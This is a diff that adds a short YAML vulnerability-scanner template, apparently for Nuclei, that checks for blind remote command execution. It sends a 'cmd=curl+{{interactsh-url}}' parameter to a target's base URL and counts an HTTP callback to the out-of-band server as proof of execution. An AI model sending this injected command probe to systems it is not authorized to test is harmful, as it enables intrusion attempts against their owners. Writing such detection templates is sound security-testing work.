@@ -1,0 +1,19 @@
+id: ai-rce-interactsh-blind
+
+info:
+  name: Blind RCE with Interactsh
+  severity: critical
+  author: reewardius
+  tags: rce,blind,oast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd=curl+{{interactsh-url}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
